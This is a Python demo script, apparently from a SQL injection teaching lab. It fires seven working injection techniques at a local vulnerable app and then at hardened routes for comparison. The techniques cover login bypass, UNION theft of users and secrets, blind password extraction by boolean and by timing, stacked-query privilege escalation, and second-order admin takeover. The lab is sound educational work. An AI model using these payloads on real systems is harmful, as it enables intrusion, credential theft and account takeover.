"""
attacks.py
Runs every SQL injection technique against the vulnerable app, then fires the
same payloads at the secure routes to show they are stopped.

Each attack prints:
  - what it is trying to do
  - the payload sent
  - the result observed
  - the same thing against the secure route

Start the server first (python3 app.py), then run this (python3 attacks.py).
It only uses the requests library and talks to the app over HTTP, exactly the
way a real attacker with nothing but a browser would.
"""

import requests
import time
import re
import html

BASE = "http://127.0.0.1:5000"


def line():
    print("-" * 70)


def banner(n, title):
    print()
    print("=" * 70)
    print(f"  ATTACK {n}: {title}")
    print("=" * 70)


def clean(text):
    """Pull readable text out of a returned HTML fragment."""
    text = re.sub(r"<[^>]+>", " ", text)
    text = html.unescape(text)
    return re.sub(r"\s+", " ", text).strip()


def result_box(resp):
    """Grab the status box text from a returned page."""
    m = re.search(r"class='box[^']*'>(.*?)</div>", resp.text, re.S)
    return clean(m.group(1)) if m else "(no status box)"


# ---------------------------------------------------------------------------
# 1. Authentication bypass
# ---------------------------------------------------------------------------
def attack_auth_bypass():
    banner(1, "Authentication bypass (login)")
    payload = "admin'-- "
    print("Goal   : log in as admin without knowing the password")
    print(f"Payload: username = {payload!r}, password = anything")
    print("Idea   : the -- comments out the password check, so the query"
          " becomes\n         ...WHERE username = 'admin'--' AND password = '...'")
    line()

    r = requests.post(f"{BASE}/login",
                      data={"username": payload, "password": "anything"})
    print("Vulnerable /login   ->", result_box(r))

    r2 = requests.post(f"{BASE}/secure/login",
                       data={"username": payload, "password": "anything"})
    print("Secure /secure/login->", result_box(r2))

    # A second classic form of the same attack.
    print()
    payload2 = "' OR '1'='1'-- "
    print(f"Variant: username = {payload2!r} (always-true condition)")
    r3 = requests.post(f"{BASE}/login",
                       data={"username": payload2, "password": "x"})
    print("Vulnerable /login   ->", result_box(r3))


# ---------------------------------------------------------------------------
# 2. Error based (error disclosure)
# ---------------------------------------------------------------------------
def attack_error_based():
    banner(2, "Error based disclosure (login)")
    payload = "'"
    print("Goal   : make the database throw, and read the leaked error")
    print(f"Payload: username = {payload!r}")
    print("Idea   : one stray quote breaks the SQL. A vulnerable app shows the"
          " raw\n         error, which hands the attacker the query shape.")
    line()

    r = requests.post(f"{BASE}/login", data={"username": payload, "password": "x"})
    print("Vulnerable /login   ->", result_box(r))

    r2 = requests.post(f"{BASE}/secure/login",
                       data={"username": payload, "password": "x"})
    print("Secure /secure/login->", result_box(r2))
    print()
    print("Note: on MySQL or MSSQL the same error channel can be weaponised to"
          " pull\n      out real data using functions like extractvalue() or"
          " updatexml().\n      SQLite has no such function, so here the error"
          " is an information leak\n      that makes the UNION attack below much"
          " easier to build.")


# ---------------------------------------------------------------------------
# 3. UNION based extraction
# ---------------------------------------------------------------------------
def attack_union():
    banner(3, "UNION based data extraction (product and search)")
    print("Step 1 : find the number of columns using ORDER BY")
    line()
    for n in range(1, 7):
        r = requests.get(f"{BASE}/product", params={"id": f"1 ORDER BY {n}"})
        box = result_box(r)
        ok = "error" not in box.lower()
        print(f"  ORDER BY {n}: {'ok' if ok else 'ERROR -> too many columns'}")
        if not ok:
            cols = n - 1
            print(f"  => the query returns {cols} columns")
            break

    print()
    print("Step 2 : UNION SELECT the users table into those 4 columns")
    payload = "0 UNION SELECT username, password, role, email FROM users"
    print(f"Payload: id = {payload!r}")
    line()
    r = requests.get(f"{BASE}/product", params={"id": payload})
    rows = re.findall(r"<tr>(.*?)</tr>", r.text, re.S)
    print("Vulnerable /product -> stolen rows:")
    for row in rows[1:]:
        cells = [clean(c) for c in re.findall(r"<td>(.*?)</td>", row, re.S)]
        if cells:
            print("   ", " | ".join(cells))

    print()
    print("Step 3 : steal from a table the UI never shows (app_secrets)")
    payload2 = ("0 UNION SELECT name, value, 'secret', 'x' FROM app_secrets")
    print(f"Payload: id = {payload2!r}")
    line()
    r = requests.get(f"{BASE}/product", params={"id": payload2})
    rows = re.findall(r"<tr>(.*?)</tr>", r.text, re.S)
    print("Vulnerable /product -> stolen secrets:")
    for row in rows[1:]:
        cells = [clean(c) for c in re.findall(r"<td>(.*?)</td>", row, re.S)]
        if cells:
            print("   ", " | ".join(cells[:2]))

    print()
    print("Same UNION payload against the secure product route:")
    r2 = requests.get(f"{BASE}/secure/product", params={"id": payload})
    print("Secure /secure/product->", result_box(r2) or clean(r2.text)[:80])


# ---------------------------------------------------------------------------
# 4. Boolean based blind
# ---------------------------------------------------------------------------
def attack_boolean_blind():
    banner(4, "Boolean based blind (profile)")
    print("Goal   : the page only says exists / not found. Recover the admin")
    print("         password one character at a time from that single bit.")
    print("Idea   : ask 'is character N equal to X ?' as part of the WHERE.")
    print("         'exists' means yes, 'not found' means no.")
    line()

    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*"
    recovered = ""
    for pos in range(1, 30):
        found = None
        for ch in charset:
            cond = (f"admin' AND substr((SELECT password FROM users WHERE "
                    f"username='admin'),{pos},1)='{ch}'-- ")
            r = requests.get(f"{BASE}/profile", params={"username": cond})
            if "User exists" in r.text:
                found = ch
                break
        if not found:
            break
        recovered += found
        print(f"  position {pos:>2}: '{found}'   recovered so far: {recovered}")
    print()
    print(f"Recovered admin password (blind): {recovered}")

    print()
    print("Same technique against the secure profile route:")
    cond = ("admin' AND substr((SELECT password FROM users WHERE "
            "username='admin'),1,1)='S'-- ")
    r = requests.get(f"{BASE}/secure/profile", params={"username": cond})
    print("Secure /secure/profile->", result_box(r),
          "(the whole string is treated as a username, so it never matches)")


# ---------------------------------------------------------------------------
# 5. Time based blind
# ---------------------------------------------------------------------------
def attack_time_blind():
    banner(5, "Time based blind (profile)")
    print("Goal   : same as blind, but when the page gives NO visible")
    print("         difference at all. We make a true answer run slowly and")
    print("         read the answer off the clock.")
    heavy = ("(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL "
             "SELECT x+1 FROM c LIMIT 8000000) SELECT x FROM c))")
    print("Idea   : CASE WHEN (guess is right) THEN <heavy query> ELSE 0 END")
    line()

    def timed(cond_char, pos):
        cond = (f"admin' AND (SELECT CASE WHEN (SELECT substr(password,{pos},1) "
                f"FROM users WHERE username='admin')='{cond_char}' THEN {heavy} "
                f"ELSE 0 END)-- ")
        t = time.time()
        requests.get(f"{BASE}/profile", params={"username": cond})
        return time.time() - t

    # Recover just the first 4 characters to keep the demo quick.
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*"
    recovered = ""
    THRESHOLD = 0.4
    for pos in range(1, 5):
        for ch in charset:
            elapsed = timed(ch, pos)
            if elapsed > THRESHOLD:
                recovered += ch
                print(f"  position {pos}: '{ch}' took {elapsed:.2f}s  -> TRUE")
                break
    print()
    print(f"Recovered first characters by timing only: {recovered}")

    print()
    print("Secure route: the payload is bound as data, the heavy branch never")
    print("runs, so the response time stays flat no matter what we guess.")
    t = time.time()
    requests.get(f"{BASE}/secure/profile",
                 params={"username": "admin' AND 1=1-- "})
    print(f"Secure /secure/profile responded in {time.time()-t:.2f}s")


# ---------------------------------------------------------------------------
# 6. Stacked queries
# ---------------------------------------------------------------------------
def attack_stacked():
    banner(6, "Stacked queries (track)")
    print("Goal   : run a second, attacker chosen statement after a semicolon.")
    print("         Here: silently promote the guest account to admin.")
    line()

    before = requests.get(f"{BASE}/debug/users").json()
    guest_before = [u for u in before if u["username"] == "guest"][0]
    print("Guest role before:", guest_before["role"])

    payload = "1; UPDATE users SET role='admin' WHERE username='guest'"
    print(f"Payload: id = {payload!r}")
    requests.get(f"{BASE}/track", params={"id": payload})

    after = requests.get(f"{BASE}/debug/users").json()
    guest_after = [u for u in after if u["username"] == "guest"][0]
    print("Guest role after :", guest_after["role"],
          "  <-- privilege escalation" if guest_after["role"] == "admin" else "")

    print()
    print("Same payload against the secure track route:")
    requests.get(f"{BASE}/secure/track", params={"id": payload})
    after2 = requests.get(f"{BASE}/debug/users").json()
    # reset guest for repeatability is handled by server restart; just report
    g = [u for u in after2 if u["username"] == "guest"][0]
    print("Guest role now   :", g["role"],
          "(secure route rejected the non numeric id, so no change from it)")


# ---------------------------------------------------------------------------
# 7. Second order
# ---------------------------------------------------------------------------
def attack_second_order():
    banner(7, "Second order injection (register then reset)")
    print("Goal   : take over the admin account. The injection is STORED during")
    print("         registration (safely) and only fires later during reset.")
    line()

    admin_before = [u for u in requests.get(f"{BASE}/debug/users").json()
                    if u["username"] == "admin"][0]
    print("Admin password before:", admin_before["password"])

    # Step 1: register a username that is itself a payload. The insert is
    # parameterised, so this is stored verbatim with no error.
    evil_username = "admin'-- "
    print(f"Step 1: register username = {evil_username!r} (stored safely)")
    reg = requests.post(f"{BASE}/register",
                        data={"username": evil_username, "password": "myownpass"})
    print("        ->", reg.json()["message"])

    # Find the id the attacker was given.
    users = requests.get(f"{BASE}/debug/users").json()
    attacker = [u for u in users if u["username"] == evil_username][0]

    # Step 2: trigger a password reset "as" the attacker account. The stored
    # username is concatenated, so the UPDATE now hits admin.
    print("Step 2: reset password while logged in as that account")
    reset = requests.post(f"{BASE}/reset",
                          data={"user_id": attacker["id"],
                                "new_password": "pwned_by_second_order"})
    print("        query that ran:", reset.json().get("query", ""))

    admin_after = [u for u in requests.get(f"{BASE}/debug/users").json()
                   if u["username"] == "admin"][0]
    print("Admin password after :", admin_after["password"],
          "  <-- admin account taken over"
          if admin_after["password"] != admin_before["password"] else "")


if __name__ == "__main__":
    print("Running all SQL injection attacks against", BASE)
    attack_auth_bypass()
    attack_error_based()
    attack_union()
    attack_boolean_blind()
    attack_time_blind()
    attack_stacked()
    attack_second_order()
    print()
    line()
    print("Done. Restart the server (python3 app.py) to reset the database")
    print("before running again.")
